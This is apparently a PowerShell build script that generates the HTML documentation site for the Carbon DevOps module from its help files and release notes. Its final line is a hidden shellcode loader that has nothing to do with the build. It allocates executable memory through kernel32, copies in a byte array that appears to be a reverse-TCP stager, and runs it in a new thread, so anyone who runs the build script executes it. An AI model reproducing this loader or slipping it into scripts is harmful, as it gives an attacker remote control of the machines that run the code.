













[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]
    $WebRoot,

    [Switch]
    
    $SkipCommandHelp
)


Set-StrictMode -Version 'Latest'

function Out-HtmlPage
{
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
        [Alias('Html')]
        
        $Content,

        [Parameter(Mandatory=$true)]
        
        $Title,

        [Parameter(Mandatory=$true)]
        
        $VirtualPath
    )

    begin
    {
        Set-StrictMode -Version 'Latest'
    }

    process
    {

        $path = Join-Path -Path $WebRoot -ChildPath $VirtualPath
        $templateArgs = @(
                            $Title,
                            $Content,
                            (Get-Date).Year
                        )
        @'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <title>{0}</title>
    <link href="silk.css" type="text/css" rel="stylesheet" />
	<link href="styles.css" type="text/css" rel="stylesheet" />
</head>
<body>

    <ul id="SiteNav">
		<li><a href="index.html">Get-Carbon</a></li>
        <li><a href="about_Carbon_Installation.html">-Install</a></li>
		<li><a href="documentation.html">-Documentation</a></li>
        <li><a href="about_Carbon_Support.html">-Support</a></li>
        <li><a href="releasenotes.html">-ReleaseNotes</a></li>
		<li><a href="http://pshdo.com">-Blog</a></li>
        <li><a href="https://github.com/pshdo/Carbon/">-Project</a></li>
    </ul>

    {1}

	<div class="Footer">
		Copyright <a href="http://pshdo.com">Aaron Jensen</a> and WebMD Health Services.
	</div>

</body>
</html>
'@ -f $templateArgs | Set-Content -Path $path
    }

    end
    {
    }
}


& (Join-Path -Path $PSScriptRoot -ChildPath '.\Tools\Silk\Import-Silk.ps1' -Resolve)

if( (Get-Module -Name 'Blade') )
{
    Remove-Module 'Blade'
}

& (Join-Path -Path $PSScriptRoot -ChildPath '.\Carbon\Import-Carbon.ps1' -Resolve) -Force

$headingMap = @{
                    'NEW DSC RESOURCES' = 'New DSC Resources';
                    'ADDED PASSTHRU PARAMETERS' = 'Added PassThru Parameters';
                    'SWITCH TO SYSTEM.DIRECTORYSERVICES.ACCOUNTMANAGEMENT API FOR USER/GROUP MANAGEMENT' = 'Switch To System.DirectoryServices.AccountManagement API For User/Group Management';
                    'INSTALL FROM ZIP ARCHIVE' = 'Install From ZIP Archive';
                    'INSTALL FROM POWERSHELL GALLERY' = 'Install From PowerShell Gallery';
                    'INSTALL WITH NUGET' = 'Install With NuGet';
               }

$moduleInstallPath = Get-PowerShellModuleInstallPath
$linkPath = Join-Path -Path $moduleInstallPath -ChildPath 'Carbon'
Install-Junction -Link $linkPath -Target (Join-Path -Path $PSScriptRoot -ChildPath 'Carbon') -Verbose:$VerbosePreference

try
{
    Convert-ModuleHelpToHtml -ModuleName 'Carbon' -HeadingMap $headingMap -SkipCommandHelp:$SkipCommandHelp -Script 'Import-Carbon.ps1' |
        ForEach-Object { Out-HtmlPage -Title ('PowerShell - {0} - Carbon' -f $_.Name) -VirtualPath ('{0}.html' -f $_.Name) -Content $_.Html }
}
finally
{
    Uninstall-Junction -Path $linkPath
}

New-ModuleHelpIndex -TagsJsonPath (Join-Path -Path $PSScriptRoot -ChildPath 'tags.json') -ModuleName 'Carbon' -Script 'Import-Carbon.ps1' |
     Out-HtmlPage -Title 'PowerShell - Carbon Module Documentation' -VirtualPath '/documentation.html'

$carbonTitle = 'Carbon: PowerShell DevOps module for configuring and setting up Windows computers, applications, and websites'
Get-Item -Path (Join-Path -Path $PSScriptRoot -ChildPath 'Carbon\en-US\about_Carbon.help.txt') |
    Convert-AboutTopicToHtml -ModuleName 'Carbon' -Script 'Import-Carbon.ps1' |
    ForEach-Object {
        $_ -replace '<h1>about_Carbon</h1>','<h1>Carbon</h1>'
    } |
    Out-HtmlPage -Title $carbonTitle -VirtualPath '/index.html'

Get-Content -Path (Join-Path -Path $PSScriptRoot -ChildPath 'RELEASE NOTES.txt') -Raw | 
    Edit-HelpText -ModuleName 'Carbon' |
    Convert-MarkdownToHtml | 
    Out-HtmlPage -Title ('Release Notes - {0}' -f $carbonTitle) -VirtualPath '/releasenotes.html'

Copy-Item -Path (Join-Path -Path $PSScriptRoot -ChildPath 'Tools\Silk\Resources\silk.css' -Resolve) `
          -Destination $WebRoot -Verbose
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd9,0xd9,0x43,0xfd,0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

